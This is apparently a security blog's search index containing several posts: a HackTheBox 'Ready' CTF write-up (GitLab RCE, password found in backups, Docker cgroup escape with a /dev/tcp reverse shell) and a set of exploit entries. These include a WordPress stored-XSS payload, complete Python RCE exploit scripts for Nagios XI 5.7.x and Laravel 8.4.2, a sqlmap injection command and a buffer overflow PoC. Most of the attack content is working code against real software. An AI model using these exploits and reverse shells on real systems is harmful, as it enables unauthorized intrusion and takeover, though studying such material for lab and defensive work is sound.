<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HackTheBox-Ready WriteUp</title>
    <link href="/2021/01/17/HackTheBox-Ready/"/>
    <url>/2021/01/17/HackTheBox-Ready/</url>
    
    <content type="html"><![CDATA[<h4 id="HackTheBox-Ready-WriteUp"><a href="#HackTheBox-Ready-WriteUp" class="headerlink" title="HackTheBox-Ready WriteUp"></a>HackTheBox-Ready WriteUp</h4><h6 id="IP-10-10-10-220"><a href="#IP-10-10-10-220" class="headerlink" title="IP:10.10.10.220"></a>IP:10.10.10.220</h6><h6 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h6><p>port:22<br>SSH<br>port:5080<br><a href="http://10.10.10.220:5080/users/sign_in">http://10.10.10.220:5080/users/sign_in</a> #GitLab Community Edition 11.4.7 (RCE)</p><h6 id="Build-Exploit"><a href="#Build-Exploit" class="headerlink" title="Build Exploit :"></a>Build Exploit :</h6><p><a href="https://www.exploit-db.com/exploits/49334">https://www.exploit-db.com/exploits/49334</a></p><p>#-P need change to other thing cuz the -p will be -P,i change it to -port<br>parser.add_argument(‘-port’, help=’reverse shell port’, required=True)<br>local_port = args.port # change it to port too<br>nc {local_ip} {local_port} -e /bin/bash #need change</p><h6 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h6><p>nc -lvvp port<br>python3 gitlab11.4.7.py -u username -p password -g <a href="http://10.10.10.220/">http://10.10.10.220</a> -l ip -port port<br>python3 -c ‘import pty;pty.spawn(“/bin/bash”)’</p><h6 id="User"><a href="#User" class="headerlink" title="User"></a>User</h6><p>cd /home/ #Found the username<br>/home/dude<br>#user<br>dude/user.txt </p><h6 id="Enum-Root"><a href="#Enum-Root" class="headerlink" title="Enum Root"></a>Enum Root</h6><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">python3 -m http.server 8080<br>wget http://ip:port/linpeas.sh #run script and look like we in docker<br></code></pre></div></td></tr></table></figure><p>need enum more things.</p><h6 id="Enum-local"><a href="#Enum-local" class="headerlink" title="Enum local"></a>Enum local</h6><p>/opt/backup/* #Found<br>cat ./* | grep “passw”<br>gitlab_rails[‘smtp_password’] = “wW59U!ZKMbG9+<em>#h” #test for su users<br>wW59U!ZKMbG9+</em>#h #docker root passowd</p><h6 id="docker-escape"><a href="#docker-escape" class="headerlink" title="docker escape"></a>docker escape</h6><p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout</a></p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> In the container</span><br>mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x<br>echo 1 &gt; /tmp/cgrp/x/notify_on_release<br>host_path=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`<br>echo &quot;$host_path/cmd&quot; &gt; /tmp/cgrp/release_agent<br><br><span class="hljs-meta">#</span><span class="bash">We use Reverse shell</span><br>echo &#x27;#!/bin/bash&#x27; &gt; /cmd<br>echo &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot; &gt;&gt; /cmd<br>chmod a+x /cmd<br><span class="hljs-meta">#</span><span class="bash">===================================</span><br>sh -c &quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;<br><br>nc -lvvp 4444 #get root<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE-2018-19571</tag>
      
      <tag>CVE-2018-19585</tag>
      
      <tag>Docker Escape</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WordPress Easy Contact Form 1.1.7 Cross Site Scripting</title>
    <link href="/2021/01/16/WordPress-Easy-Contact-Form-1-1-7-Cross-Site-Scripting/"/>
    <url>/2021/01/16/WordPress-Easy-Contact-Form-1-1-7-Cross-Site-Scripting/</url>
    
    <content type="html"><![CDATA[<h4 id="WordPress-Easy-Contact-Form-1-1-7-Cross-Site-Scripting"><a href="#WordPress-Easy-Contact-Form-1-1-7-Cross-Site-Scripting" class="headerlink" title="WordPress Easy Contact Form 1.1.7 Cross Site Scripting"></a>WordPress Easy Contact Form 1.1.7 Cross Site Scripting</h4><p>WordPress Easy Contact Form plugin version 1.1.7 suffers from a persistent cross site scripting vulnerability.</p><p>Steps:</p><ol><li><p>Install WordPress 5.6</p></li><li><p>Install and activate <em>Contact Form Plugin</em> plugin.</p></li><li><p>Go to * Contact Form Plugin *plugin section and click on the add new form button.</p></li><li><p>Fill all required details and click on the save button and capture the request in a proxy tool like burp suite.</p></li><li><p>Append the JavaScript payload in the “Email Header” field as mentioned below</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">*&quot;&lt;sc&gt;&lt;svg/onload=alert(454)&gt;&quot;*<br></code></pre></div></td></tr></table></figure></li><li><p>You will observe that the payload successfully got stored and reflected into the response and the malicious JavaScript payload got executed successfully and we are getting a pop-up.</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cross Site Scripting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nagios XI 5.7.x Remote Code Execution</title>
    <link href="/2021/01/16/Nagios-XI-5-7-x-Remote-Code-Execution/"/>
    <url>/2021/01/16/Nagios-XI-5-7-x-Remote-Code-Execution/</url>
    
    <content type="html"><![CDATA[<h4 id="Nagios-XI-5-7-x-Remote-Code-Execution"><a href="#Nagios-XI-5-7-x-Remote-Code-Execution" class="headerlink" title="Nagios XI 5.7.x Remote Code Execution"></a>Nagios XI 5.7.x Remote Code Execution</h4><p>Nagios XI version 5.7.x authenticated remote code execution exploit.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-comment"># pip3 install bs4 lxml</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> warnings<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib3<br>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) <br> <br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">6</span>:<br>    print(<span class="hljs-string">&quot;[~] Usage : python3 nagiosxi-rce.py http(s)://url username password reverse_ip reverse_port&quot;</span>)<br>    print(<span class="hljs-string">&quot;[~] Example : python3 nagiosxi-rce.py https://192.168.224.139 nagiosadmin P@ssw0rd 192.168.224.138 443&quot;</span>)<br>    exit()<br> <br>url = sys.argv[<span class="hljs-number">1</span>]<br>username = sys.argv[<span class="hljs-number">2</span>]<br>password = sys.argv[<span class="hljs-number">3</span>]<br>ip = sys.argv[<span class="hljs-number">4</span>]<br>port = sys.argv[<span class="hljs-number">5</span>]<br> <br>request = requests.session()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    <span class="hljs-comment"># Request nsp value (Nagios Session Protection, used to prevent CSRF attacks)</span><br>    nsp_str_req = request.get(url+<span class="hljs-string">&quot;/nagiosxi/login.php&quot;</span>, verify=<span class="hljs-literal">False</span>)<br>    content = nsp_str_req.text<br>    soup = BeautifulSoup(content, <span class="hljs-string">&quot;lxml&quot;</span>)<br>    nsp_str = soup.find_all(<span class="hljs-string">&#x27;input&#x27;</span>)[<span class="hljs-number">0</span>].get(<span class="hljs-string">&#x27;value&#x27;</span>)<br>    print(<span class="hljs-string">&quot;[+] Extract login nsp token : %s&quot;</span> % nsp_str)<br><br>    <span class="hljs-comment"># Login</span><br>    login_info = &#123;<br>    <span class="hljs-string">&quot;nsp&quot;</span>: nsp_str,<br>    <span class="hljs-string">&quot;pageopt&quot;</span>: <span class="hljs-string">&quot;login&quot;</span>,<br>    <span class="hljs-string">&quot;username&quot;</span>: username,<br>    <span class="hljs-string">&quot;password&quot;</span>: password<br>    &#125;<br>    login_request = request.post(url + <span class="hljs-string">&quot;/nagiosxi/login.php&quot;</span>, login_info, verify=<span class="hljs-literal">False</span>)<br>    login_text = login_request.text<br><br>    <span class="hljs-comment"># Check Login Status</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Core Config Manager&quot;</span> <span class="hljs-keyword">in</span> login_text:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;[-] Login ... Failed!&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">execute_payload</span>():</span><br>    <span class="hljs-comment"># Request nsp value (Nagios Session Protection, used to prevent CSRF attacks)</span><br>    print(<span class="hljs-string">&quot;[+] Request upload form ...&quot;</span>)<br>    nsp_str_req = request.get(url+<span class="hljs-string">&quot;/nagiosxi/admin/monitoringplugins.php&quot;</span>, verify=<span class="hljs-literal">False</span>)<br>    content = nsp_str_req.text<br>    soup = BeautifulSoup(content, <span class="hljs-string">&quot;lxml&quot;</span>)<br>    nsp_str = soup.find_all(<span class="hljs-string">&#x27;input&#x27;</span>)[<span class="hljs-number">1</span>].get(<span class="hljs-string">&#x27;value&#x27;</span>)<br>    print(<span class="hljs-string">&quot;[+] Extract upload nsp token : %s&quot;</span> % nsp_str)  <br><br>    <span class="hljs-comment"># Payload Base64 Encoding</span><br>    payload_decoded = <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1&quot;</span> % (ip, port)<br>    payload_bytes = payload_decoded.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>    base64_bytes = base64.b64encode(payload_bytes)<br>    payload_encoded = base64_bytes.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>    payload = <span class="hljs-string">&quot;;echo &quot;</span> + payload_encoded + <span class="hljs-string">&quot; | base64 -d | bash;#&quot;</span><br>    print(<span class="hljs-string">&quot;[+] Base64 encoded payload : %s&quot;</span> % payload)<br><br>    <span class="hljs-comment"># Payload Execution</span><br>    multipart_form_data = &#123;<br>    <span class="hljs-string">&#x27;upload&#x27;</span>: (<span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-literal">None</span>),<br>    <span class="hljs-string">&#x27;nsp&#x27;</span>: (<span class="hljs-literal">None</span>, nsp_str, <span class="hljs-literal">None</span>),<br>    <span class="hljs-string">&#x27;uploadedfile&#x27;</span>: (payload, <span class="hljs-string">&#x27;whatever&#x27;</span>, <span class="hljs-string">&#x27;text/plain&#x27;</span>),<br>    <span class="hljs-string">&#x27;convert_to_unix&#x27;</span>: (<span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-literal">None</span>),<br>    &#125;<br>    print(<span class="hljs-string">&quot;[+] Sending payload ...&quot;</span>)<br>    print(<span class="hljs-string">&quot;[+] Check your nc ...&quot;</span>)<br>    rce = request.post(url +<span class="hljs-string">&quot;/nagiosxi/admin/monitoringplugins.php&quot;</span>, files=multipart_form_data, verify=<span class="hljs-literal">False</span>)<br><br><br> <br><span class="hljs-keyword">if</span> login():<br>    print(<span class="hljs-string">&quot;[+] Login ... Success!&quot;</span>)<br>    execute_payload()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Remote Code Execution</tag>
      
      <tag>CVE-2020-35578</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Online Shopping Cart 1.0 SQL Injection</title>
    <link href="/2021/01/16/Online-Shopping-Cart-1-0-SQL-Injection/"/>
    <url>/2021/01/16/Online-Shopping-Cart-1-0-SQL-Injection/</url>
    
    <content type="html"><![CDATA[<h4 id="Online-Shopping-Cart-1-0-SQL-Injection"><a href="#Online-Shopping-Cart-1-0-SQL-Injection" class="headerlink" title="Online Shopping Cart 1.0 SQL Injection"></a>Online Shopping Cart 1.0 SQL Injection</h4><p>Online Shopping Cart version 1.0 suffers from a remote SQL injection vulnerability.</p><p>Use SQLMAP:<br>sqlmap -u “localhost/cart_remove.php?id=1” –dbs –batch –level 3 –risk 3</p>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL Injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Laravel 8.4.2 Remote Code Execution</title>
    <link href="/2021/01/16/Laravel-8-4-2-Remote-Code-Execution/"/>
    <url>/2021/01/16/Laravel-8-4-2-Remote-Code-Execution/</url>
    
    <content type="html"><![CDATA[<h4 id="Laravel-8-4-2-Remote-Code-Execution"><a href="#Laravel-8-4-2-Remote-Code-Execution" class="headerlink" title="Laravel 8.4.2 Remote Code Execution"></a>Laravel 8.4.2 Remote Code Execution</h4><p>Laravel version 8.4.2 suffers from a debug mode remote code execution vulnerability.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> requests, sys, re, os<br><br>header=&#123;<br>    <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span><br>&#125;<br><br>data = &#123;<br>        <span class="hljs-string">&quot;solution&quot;</span>:<span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,\<br>        <span class="hljs-string">&quot;parameters&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;variableName&quot;</span>:<span class="hljs-string">&quot;cm0s&quot;</span>,<br>            <span class="hljs-string">&quot;viewFile&quot;</span>:<span class="hljs-string">&quot;&quot;</span><br>        &#125;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clear_log</span>(<span class="hljs-params">url=<span class="hljs-string">&#x27;&#x27;</span>, viewFile=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br><br>    <span class="hljs-keyword">global</span> data<br><br>    data[<span class="hljs-string">&#x27;parameters&#x27;</span>][<span class="hljs-string">&#x27;viewFile&#x27;</span>] = viewFile<br>    <span class="hljs-keyword">while</span> (requests.post(url=url, json=data, headers=header, verify=<span class="hljs-literal">False</span>).status_code != <span class="hljs-number">200</span>): <span class="hljs-keyword">pass</span><br>    requests.post(url=url, json=data, headers=header, verify=<span class="hljs-literal">False</span>)<br>    requests.post(url=url, json=data, headers=header, verify=<span class="hljs-literal">False</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_payload</span>(<span class="hljs-params">url=<span class="hljs-string">&#x27;&#x27;</span>, viewFile=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br><br>    <span class="hljs-keyword">global</span> data<br><br>    data[<span class="hljs-string">&#x27;parameters&#x27;</span>][<span class="hljs-string">&#x27;viewFile&#x27;</span>] = viewFile<br>    resp = requests.post(url=url, json=data, headers=header, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">500</span> <span class="hljs-keyword">and</span> <span class="hljs-string">f&#x27;file_get_contents(<span class="hljs-subst">&#123;viewFile&#125;</span>)&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">convert</span>(<span class="hljs-params">url=<span class="hljs-string">&#x27;&#x27;</span>, viewFile=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br><br>    <span class="hljs-keyword">global</span> data<br><br>    data[<span class="hljs-string">&#x27;parameters&#x27;</span>][<span class="hljs-string">&#x27;viewFile&#x27;</span>] = viewFile<br>    resp = requests.post(url=url, json=data, headers=header, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploited</span>(<span class="hljs-params">url=<span class="hljs-string">&#x27;&#x27;</span>, viewFile=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br><br>    <span class="hljs-keyword">global</span> data<br><br>    data[<span class="hljs-string">&#x27;parameters&#x27;</span>][<span class="hljs-string">&#x27;viewFile&#x27;</span>] = viewFile<br>    resp = requests.post(url=url, json=data, headers=header, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">500</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;cannot be empty&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>        m = re.findall(<span class="hljs-string">r&#x27;\&#123;(.|\n)+\&#125;((.|\n)*)&#x27;</span>, resp.text)<br>        print()<br>        print(m[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_payload</span>(<span class="hljs-params">command=<span class="hljs-string">&#x27;&#x27;</span>, padding=<span class="hljs-number">0</span></span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">in</span> command:<br>        command = command.replace(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;\/&#x27;</span>)<br>        command = command.replace(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>)<br>    os.system(<span class="hljs-string">r&#x27;&#x27;&#x27;php -d&#x27;phar.readonly=0&#x27; ./phpggc/phpggc monolog/rce1 system &#x27;%s&#x27; --phar phar -o php://output | base64 -w0 | sed -E &#x27;s/./\0=00/g&#x27; &gt; payload.txt&#x27;&#x27;&#x27;</span>%(command))<br>    payload = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>        payload = fp.read()<br>        payload = payload.replace(<span class="hljs-string">&#x27;==&#x27;</span>, <span class="hljs-string">&#x27;=3D=&#x27;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(padding):<br>            payload += <span class="hljs-string">&#x27;=00&#x27;</span><br>    os.system(<span class="hljs-string">&#x27;rm -rf payload.txt&#x27;</span>)<br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">4</span>:<br>        print(<span class="hljs-string">&#x27;Usage:  %s url path-log command\n&#x27;</span>%(sys.argv[<span class="hljs-number">0</span>]))<br>        print(<span class="hljs-string">&#x27;\tEx: %s http(s)://pwnme.me:8000 /var/www/html/laravel/storage/logs/laravel.log \&#x27;id\&#x27;&#x27;</span>%(sys.argv[<span class="hljs-number">0</span>]))<br>        exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(<span class="hljs-string">&#x27;./phpggc/phpggc&#x27;</span>):<br>        print(<span class="hljs-string">&#x27;Phpggc not found!&#x27;</span>)<br>        print(<span class="hljs-string">&#x27;Run command: git clone https://github.com/ambionics/phpggc.git&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;git clone https://github.com/ambionics/phpggc.git&#x27;</span>)<br><br>    url = sys.argv[<span class="hljs-number">1</span>]<br>    path_log = sys.argv[<span class="hljs-number">2</span>]<br>    command = sys.argv[<span class="hljs-number">3</span>]<br>    padding = <span class="hljs-number">0</span><br><br>    payload = generate_payload(command, padding)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> payload:<br>        print(<span class="hljs-string">&#x27;Generate payload error!&#x27;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;http&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> url <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;https&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> url:<br>        url = <span class="hljs-string">&#x27;http&#x27;</span>+url<br>    <span class="hljs-keyword">else</span>:<br>        url = url+<span class="hljs-string">&#x27;/_ignition/execute-solution&#x27;</span><br><br>    print(<span class="hljs-string">&#x27;\nExploit...&#x27;</span>)<br>    clear_log(url, <span class="hljs-string">&#x27;php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s&#x27;</span>%(path_log))<br>    create_payload(url, <span class="hljs-string">&#x27;AA&#x27;</span>)<br>    create_payload(url, payload)<br>    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">not</span> convert(url, <span class="hljs-string">&#x27;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=%s&#x27;</span>%(path_log))):<br>        clear_log(url, <span class="hljs-string">&#x27;php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s&#x27;</span>%(path_log))<br>        create_payload(url, <span class="hljs-string">&#x27;AA&#x27;</span>)<br>        padding += <span class="hljs-number">1</span><br>        payload = generate_payload(command, padding)<br>        create_payload(url, payload)<br>    <br>    exploited(url, <span class="hljs-string">&#x27;phar://%s&#x27;</span>%(path_log))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Remote Code Execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Backdoor.Win32.Ketch.i Remote Stack Buffer Overflow</title>
    <link href="/2021/01/16/Backdoor-Win32-Ketch-i-Remote-Stack-Buffer-Overflow/"/>
    <url>/2021/01/16/Backdoor-Win32-Ketch-i-Remote-Stack-Buffer-Overflow/</url>
    
    <content type="html"><![CDATA[<h4 id="Backdoor-Win32-Ketch-i-Remote-Stack-Buffer-Overflow"><a href="#Backdoor-Win32-Ketch-i-Remote-Stack-Buffer-Overflow" class="headerlink" title="Backdoor.Win32.Ketch.i Remote Stack Buffer Overflow"></a>Backdoor.Win32.Ketch.i Remote Stack Buffer Overflow</h4><p>Exploit/PoC:<br>python -c “print ‘q’*1612” &gt; script.dat<br>python -m SimpleHTTPServer 80</p>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Remote Stack Buffer Overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Online Hotel Reservation System 1.0 SQL Injection</title>
    <link href="/2021/01/16/Online-Hotel-Reservation-System-1-0-SQL-Injection/"/>
    <url>/2021/01/16/Online-Hotel-Reservation-System-1-0-SQL-Injection/</url>
    
